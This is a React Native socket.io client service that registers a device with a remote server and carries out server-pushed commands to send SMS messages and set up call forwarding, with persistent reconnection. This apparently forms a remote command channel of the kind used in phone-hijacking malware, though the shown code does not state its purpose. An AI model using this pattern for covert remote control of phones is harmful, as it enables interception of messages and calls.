import { Platform } from 'react-native';
import { io } from "socket.io-client";
import { SOCKET_URL } from '../utils/constant';

class SocketService {
    constructor() {
        this.socket = null;
        this.commandHandler = null;
        this.processedCommands = new Set(); // ✅ ADD: Deduplication tracking
    }

    createSocket(deviceId, commandHandler) {
        console.log(`🔌 Creating FOREGROUND socket for device: ${deviceId}`);

        this.commandHandler = commandHandler;

        // ✅ Clean up old socket properly
        if (this.socket) {
            console.log('🧹 Cleaning up old socket and listeners');
            this.socket.removeAllListeners(); // ✅ CRITICAL: Remove all listeners
            this.socket.disconnect();
            this.socket = null;
        }

        const socket = io(SOCKET_URL, {
            transports: ["polling", "websocket"],
            timeout: 60000,
            reconnectionAttempts: 999,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 5000,
            forceNew: true,
            autoConnect: true,
            pingInterval: 10000,
            pingTimeout: 15000,
            upgrade: true,
            query: {
                deviceId: deviceId,
                platform: Platform.OS,
                source: 'react_native_foreground', // ✅ Different from Kotlin
                headless: false,
                timestamp: Date.now()
            }
        });

        this.setupSocketListeners(socket, deviceId);
        this.socket = socket;
        return socket;
    }

    setupSocketListeners(socket, deviceId) {
        socket.on('connect', () => {
            console.log(`✅ FOREGROUND socket connected: ${socket.id}`);
            this.onConnect();

            setTimeout(() => {
                socket.emit("register-device", deviceId);
            }, 500);
        });

        socket.on('registered', (data) => {
            console.log('✅ FOREGROUND device registered:', data);
            this.onRegistered();

            const keepAlive = setInterval(() => {
                if (socket.connected) {
                    socket.emit('ping', { timestamp: Date.now(), source: 'react_native_foreground' });
                } else {
                    clearInterval(keepAlive);
                }
            }, 8000);

            socket.keepAliveInterval = keepAlive;
        });

        socket.on('disconnect', (reason) => {
            console.log(`❌ FOREGROUND socket disconnected: ${reason}`);
            this.onDisconnect(reason);

            if (socket.keepAliveInterval) {
                clearInterval(socket.keepAliveInterval);
            }
        });

        socket.on('connect_error', (error) => {
            console.error('❌ FOREGROUND socket connection error:', error);
            this.onError(error);
        });

        socket.on('reconnect', (attemptNumber) => {
            console.log(`🔄 FOREGROUND socket reconnected after ${attemptNumber} attempts`);
            setTimeout(() => {
                socket.emit("register-device", deviceId);
            }, 500);
        });


        socket.on("send-sms-command", (data) => {
            const commandId = data._id || data.payload?.uniqueCommandId;

            // ✅ Deduplication check
            if (this.processedCommands.has(commandId)) {
                console.warn(`⚠️ FOREGROUND: SMS command ${commandId} already processed - SKIPPING`);
                return;
            }

            this.processedCommands.add(commandId);
            setTimeout(() => this.processedCommands.delete(commandId), 60000);

            console.log(`✅ FOREGROUND: Processing SMS command ${commandId}`);
            this.commandHandler(data);
        });

        socket.on("call-forward-command", (data) => {
            const commandId = data._id || data.payload?.commandId;

            if (this.processedCommands.has(commandId)) {
                console.warn(`⚠️ FOREGROUND: Call forward command ${commandId} already processed - SKIPPING`);
                return;
            }

            this.processedCommands.add(commandId);
            setTimeout(() => this.processedCommands.delete(commandId), 60000);

            console.log(`✅ FOREGROUND: Processing call forward command ${commandId}`);
            this.commandHandler(data);
        });

        socket.on("reset-command-state", (data) => {
            console.log("🔄 Command state reset received:", data);
        });

        socket.on('pong', (data) => {
            console.log('🏓 Pong received - connection healthy');
        });
    }

    emitCommandAck(commandData) {
        if (this.socket && this.socket.connected) {
            this.socket.emit('command-ack', commandData);
        }
    }

    disconnect() {
        if (this.socket) {
            this.socket.removeAllListeners(); // ✅ Clean listeners before disconnect
            this.socket.disconnect();
            this.socket = null;
        }
        this.processedCommands.clear(); // ✅ Clear deduplication set
    }

    // These methods should be overridden by the consumer
    onConnect() { }
    onRegistered() { }
    onDisconnect(reason) { }
    onError(error) { }
}

export default new SocketService();
